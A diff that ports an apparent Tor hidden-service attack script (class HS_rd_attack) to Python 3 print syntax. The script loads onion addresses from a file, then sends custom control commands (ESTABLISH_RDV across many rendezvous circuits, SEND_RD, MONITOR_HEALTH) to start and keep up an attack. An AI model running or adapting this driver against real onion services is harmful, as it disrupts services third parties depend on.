@@ -56,12 +56,12 @@ class HS_rd_attack():
     """
 
     def hs_attack_retry_intro_callback(self, m):
-        print m
+        print(m)
 
         # pdb.set_trace()
         def callback_i(onion_address):
             # time.sleep(5)
-            print "Retrying RDV establishment"
+            print("Retrying RDV establishment")
             self.launch(onion_address)
 
         # t = Thread(target=callback, args=(self.current_target,))
@@ -72,17 +72,17 @@ class HS_rd_attack():
         # self.launch(self.current_target)
 
     def hs_attack_ready_callback(self, e):
-        print "Circuits are established ... Scheduling the attack until {0}...".format(self.t_until)
+        print("Circuits are established ... Scheduling the attack until {0}...".format(self.t_until))
         r = self.process.tor_protocol.queue_command('SEND_RD {0}'.format(self.t_until))
         return r
 
     def hs_attack_info_callback(self, i):
         if "HS_ATTACK" in i or "rendcirc" in i:
-            print "INFO:", i
+            print("INFO:", i)
 
     def hs_attack_debug_callback(self, d):
         if "HS_ATTACK" in d:
-            print "DEBUG", d
+            print("DEBUG", d)
 
     def hs_attack_next_onion_callback(self):
         pass
@@ -95,7 +95,7 @@ class HS_rd_attack():
         for line in open(onionaddr_file):
             line = line[:-1]  # remove return line character
             self.onions.append(line)
-        print 'Setting event listeners'
+        print('Setting event listeners')
         process.tor_protocol.add_event_listener('HS_ATTACK_READY', self.hs_attack_ready_callback)
         process.tor_protocol.add_event_listener('HS_ATTACK_RETRY_INTRO',
                                                 self.hs_attack_retry_intro_callback)
@@ -106,18 +106,18 @@ class HS_rd_attack():
         # process.protocol.add_event_listener('HS_ATTACK_NEXT', hs_attack_next_onion_callback)
         # schedule the attack
         self.current_target = self.onions.pop()
-        print 'launch attack on %s' % self.current_target
+        print('launch attack on %s' % self.current_target)
         self.launch(self.current_target)
         self.monitor = task.LoopingCall(self.monitor_attack_healthiness)
         self.monitor.start(5.0)
 
     def launch(self, onion_address):
-        print 'Sending command ESTABLISH_RDV to %s through %d rendezvous circuits' % (onion_address, self.nbr_circs)
+        print('Sending command ESTABLISH_RDV to %s through %d rendezvous circuits' % (onion_address, self.nbr_circs))
         r = self.process.tor_protocol.queue_command('ESTABLISH_RDV %s %d' % (onion_address, self.nbr_circs))
         # return r
 
     def monitor_attack_healthiness_callback(self, e):
-        print "monitor callback - todo: display info"
+        print("monitor callback - todo: display info")
 
     def monitor_attack_healthiness(self):
         """
@@ -134,25 +134,25 @@ class HS_rd_attack():
         # d.addCallback(callback_m)
         # reactor.callLater(10, d.callback)
         # return d
-        print 'Checking attack healthiness ...'
+        print('Checking attack healthiness ...')
         self.process.tor_protocol.queue_command('MONITOR_HEALTH')
 
 
 def launched(process_proto):
-    print "Tor has launched."
+    print("Tor has launched.")
     rd_attack = HS_rd_attack(process_proto, onionaddr_file, nbr_circs, t_until)
     # reactor.stop()
 
 
 def error(failure):
-    print "There was an error", failure.getErrorMessage()
+    print("There was an error", failure.getErrorMessage())
     reactor.stop()
 
 
 def progress(percent, tag, summary):
     ticks = int((percent / 100.0) * 10.0)
     prog = (ticks * '#') + ((10 - ticks) * '.')
-    print '%s %s' % (prog, summary)
+    print('%s %s' % (prog, summary))
 
 
 if __name__ == "__main__":
